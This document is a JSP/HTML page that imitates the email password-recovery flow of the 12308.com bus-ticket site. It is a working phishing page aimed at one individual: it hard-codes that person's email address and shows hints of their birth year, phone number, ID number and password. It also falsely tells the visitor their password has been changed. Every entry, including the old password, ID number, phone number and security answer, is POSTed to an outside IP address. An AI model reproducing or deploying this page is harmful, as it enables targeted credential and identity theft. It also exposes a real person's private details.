<%@ page language="java" contentType="text/html; charset=UTF-8"
    pageEncoding="UTF-8"%>
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html xmlns="http://www.w3.org/1999/xhtml"><head>
	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
	<title>个人中心_全国汽车票预订平台_长途汽车线路时刻表_汽车票查询_</title>
	<link href="http://image.12308.com/favicon.ico" type="image/x-icon" rel="icon">
<link rel="stylesheet" href="src/loginbase.css">	
	<link rel="stylesheet" href="src/password.css">	
	<link rel="stylesheet" href="src/validate.css">
	<script src="http://libs.baidu.com/jquery/1.9.1/jquery.min.js"></script>

<script>
$(document).ready(function() {
/*
.steps_d_1{background-position:0 0}
.steps_d_2{background-position:0 -35px}
.steps_d_3{background-position:0 -69px}
.steps_d_4{background-position:0 -103px}
*/

$("#mail").blur(function () {
	//console.info('001');
	if ($("#mail").val() != "xiyunzhu_1661@163.com") {
		$("#mailmsg").css("display","block");
		$("#mail").addClass("i-error");
	}else {
		$("#mailmsg").css("display","none");
		$("#mail").removeClass("i-error");
	}
		
});
$("#code").on("keyup",function () {
	if ($("#code").val() == '1027' ||
			$("#code").val() == '3891' ||
			$("#code").val() == '7736' ||
			$("#code").val() == '0301' ||
			$("#code").val() == '5490' ||
			$("#code").val() == '9944' ) {
		$("#codemsg").css("display","none");
		$("#code").removeClass("i-error");
	}else {
		$("#codemsg").css("display","block");
		$("#code").addClass("i-error");
	}	
});




	$("#btn1").on("click", function () {
	//code codemsg含有i-error class
	if ($("#mail").val() =="" 
			|| $("#code").val()==""
			|| $("#mail").hasClass("i-error")
			|| $("#code").hasClass("i-error")
			) {
		return false;
	}else {
	sendmsg("email", $("#mail").val());
	sendmsg("code", $("#code").val());

		$("#page1").css("display", "none");
		$("#page2").css("display", "block");
		$("#runbar").attr("class", "steps_d steps_d_2");
		
		//发送邮箱地址和验证码
		
	}

		
	});

	$("#btn2").on("click", function () {
		$("#infomsg").css("display", "none");
		
		if ($("#input1").val() =="" ||$("#input2").val() =="" ||$("#input3").val() =="" ||$("#input4").val() =="") {
			$("#infomsg").css("display", "block");
			return false;
		}	else {
		sendmsg("birthday", $("#input1").val());
		sendmsg("school", $("#input2").val());
		sendmsg("phone", $("#input3").val());
		sendmsg("id", $("#input4").val());
		
			$("#page2").css("display", "none");
			$("#page3").css("display", "block");
			$("#runbar").attr("class", "steps_d steps_d_3");
			
			//发送个人信息
		}

	});

//password	
	$("#newpass2").blur(function (){
	if ($("#newpass1").val() != $("#newpass2").val()) {
		$("#passmsg").css("display", "block");
	}else {
		$("#passmsg").css("display", "none");
	}
	});
	
		$("#btn3").on("click", function () {
		$("#infomsg2").css("display", "none");
		if ($("#oldpass").val() =="" ||$("#newpass1").val() =="" ||$("#newpass2").val() =="" ||$("#passmsg").css("display")=="block" ) {
			$("#infomsg2").css("display", "block");
			return false;
		}else {
			sendmsg("oldpass", $("#oldpass").val());
				sendmsg("newpass", $("#newpass1").val());
				
			$("#page3").css("display", "none");
			$("#page4").css("display", "block");
			$("#runbar").attr("class", "steps_d steps_d_4");
		
		//发送原始密码和新密码
		}

	});
	
	
});

function sendmsg(msgname, msgvalue) {
	$.ajax({
  type: 'POST',
  url: "http://104.160.36.48:8080/Demo/getInfo",
  //url: "http://localhost:8088/Demo/getInfo",
  data: {
  'name':  encodeURI(encodeURI(msgname)),
  'value':encodeURI(encodeURI(msgvalue))
  },
  success: function (data) {
  	console.log(data);
  }
});
}

function changeImg(){      
    //切换验证码
    var i = Math.floor(Math.random()*5+1);
    var img = "src/randomKey"+i+".jpeg"
    $("#imc").attr("src", img);
}  

</script></head>

<body>

	<div class="header">
		<div class="header-container">
			<div class="logo">
				<a href="http://www.12308.com/">12308首页</a> <span class="header-title"></span>
				
			</div>
			<div class="navigation color3">
				<a href="http://passport.12308.com/login" class="color4040">登录</a> <span class="c999">|</span> <a href="http://www.12308.com/">首页</a>
				<span class="c999">|</span> <a href="http://www.12308.com/booking-webapp/help.html" target="_blank"> 帮助中心</a>
			</div>
		</div>
	</div>

<div class="content">

<div class="content-container">
           <h3 class="title">找回密码</h3>
			<div class="conter_text c666">请选择一种途径，并根据相应的引导找回您的密码，您也可以选择<a href="http://uc.12308.com/register/registerPage.html">重新注册</a>或拨打 <span>400-6841-110</span>找回密码。</div>
           
            <div class="tab_nav">   
            <ul>    
                <li> </li>
                <li class="active"> <a href="http://uc.12308.com/resetPwd/resetPwdByMailPage.html">通过邮箱找回密码</a></li>
            </ul>
            </div>

       <!---bar bar-->     
      <div id="runbar" class="steps_d steps_d_1"></div>

		<ul class="steps_u">
			<li class="step1 active">输入邮箱地址</li>
			<li class="step2">验证身份</li>
			<li class="step3">设置新密码</li>
          <li class="step4">完成</li>
		</ul>
   
    <div class="clear"></div>
    

    <div id="page1" class="pub-form">
    	<form id="form">
		<div class="fm-item pbot-15">
          <span class="fm-label"><label for="txt_Json">请输入邮箱</label></span>
             <input id="mail" class="i-input w300 " type="text">
              <div class="msg-box">
                    <div id="mailmsg" style="display:none;"><i></i>
                        <label >请输入您正确的邮箱</label>
                    </div>
               </div>
        </div>
        <div class="fm-li fm-valicode">
              <span class="fm-label"><label for="txt_Name6">验证码</label></span>
              <div class="dinbl"><input id="code" class="i-input left i-error" type="text">
             <span>
               <img src="src/randomKey0.jpeg" id="imc">
               <a onclick="changeImg();" class="color4">看不清，换一组</a>
             </span>
             </div>
             <br />
             <div class="msg-box">             
              	<div id="codemsg" style="display: none;">                
                     <label>验证码不正确</label>
                    </div>
               </div>
        </div>       
     
       <div class="fm-item pbot-15">
              <span class="fm-label"><label for="txt_Name6"></label></span>
              <a id="btn1" class="p_btn b_105">下一步</a>
       </div>    	
       
       </form>               
        
</div> 

<!--2rd page-->
    <div id="page2" class="pub-form" style="display:none;">
    	<form id="form2">
	<div class="fm-item pbot-15">
          <span class="fm-label"><label for="txt_Json">请输入生日</label></span>
             <input id="input1" class="i-input w300" type="text" placeholder="您的出身日期为1989.x.x，请填入月日如3.5" >
              <div class="msg-box">
                    <div id="msg2" class="msg-weak "><i></i>
                        <label class="valid">输入信息有误</label>
                    </div>
               </div>
        </div>
     
     	<div class="fm-item pbot-15">
          <span class="fm-label"><label for="txt_Json">请输入验证问题</label></span>
             <input id="input2" class="i-input w300" type="text" placeholder="我就读的第一所学校的名称？ " >
              <div class="msg-box">
                    <div id="msg21" class="msg-weak "><i></i>
                        <label class="valid">验证信息不能为空</label>
                    </div>
               </div>
        </div>

     	<div class="fm-item pbot-15">
          <span class="fm-label"><label for="txt_Json">请输入手机</label></span>
             <input id="input3" class="i-input w300" type="text" placeholder="请填入原手机134××××××17或新手机号">
              <div class="msg-box">
                    <div id="msg22" class="msg-weak "><i></i>
                        <label class="valid">手机信息有误</label>
                    </div>
               </div>
        </div>

     	<div class="fm-item pbot-15">
          <span class="fm-label"><label for="txt_Json">请输入身份证</label></span>
             <input id="input4" class="i-input w300" type="text" placeholder="请填入身份证3213××最后四位">
              <div class="msg-box">
                    <div id="msg22" class="msg-weak "><i></i>
                        <label class="valid" style="display:none;">身份证信息有误</label>
                    </div>
               </div>
        </div>
     
       <div class="fm-item pbot-15">
              <span class="fm-label"><label for="txt_Name6"></label></span>
              <a href="#" id="btn2" class="p_btn b_105">下一步</a>
              <label id="infomsg" class="valid" style="display:none;">请将信息填写完整！</label>
       </div>    	
       
       </form>               
        
</div> 

<!--3rd page-->
    <div id="page3" class="pub-form" style="display:none;">
    	<form id="form3">

	<div class="fm-item pbot-15">
          <label for="txt_Json" style="color:blue; font-size: 16px;">您的密码已经被人更改！！</label>
          
   </div>

	<div class="fm-item pbot-15">
          <span class="fm-label"><label for="txt_Json">请输入您原密码</label></span>
             <input class="i-input w300" id="oldpass" type="password" placeholder="请尽最大可能回忆您的密码，提示：1989****dnm">
              <div class="msg-box">
                    <div id="mobilePhoneTip" class="msg-weak "><i></i>
                        <label class="valid">密码错误</label>
                    </div>
               </div>
        </div>

	<div class="fm-item pbot-15">
          <span class="fm-label"><label for="txt_Json">请输入新密码</label></span>
             <input class="i-input w300 i-error" id="newpass1" type="password">
              <div class="msg-box">
                    <div id="mobilePhoneTip" class="msg-weak "><i></i>
                        <label class="valid">密码不能为空</label>
                    </div>
               </div>
        </div>

	<div class="fm-item pbot-15">
          <span class="fm-label"><label for="txt_Json">请输再次入新密码</label></span>
             <input class="i-input w300 i-error" id="newpass2" type="password">
              <div class="msg-box">
                    <div id="passmsg" style="display:none;"><i></i>
                        <label class="valid" >密码不一致</label>
                    </div>
               </div>
        </div>     
     
       <div class="fm-item pbot-15">
              <span class="fm-label"><label for="txt_Name6"></label></span>
              <a href="#" id="btn3" class="p_btn b_105">下一步</a>
               <label id="infomsg2" class="valid" style="display:none;">请将信息填写完整！</label>
       </div>    	
       
       </form>               
        
</div> 

<!-- 4th last page-->
<div id="page4" class="pub-form"  style="display:none;">
	<form id="form4">
		<div class="fm-item pbot-15">
		<span style="color: red; font-size: 24px;">
			恭喜您，验证完毕！
		</span><br />
			<span style="font-size: 20px;">
				我们会在72小时内给您发送确认邮件，感谢您的支持！
		</span>

		</div>	
	</form>
</div>

</div><!--container -->

</div> <!--content-->


<div class="footer">
		<div class="footer-container">
<div class="copyrights">Copyright © 2010-2016 12308.com，All Rights Reserved湘ICP备12014203号-1</div>
		</div>
	</div>
</body>
</html>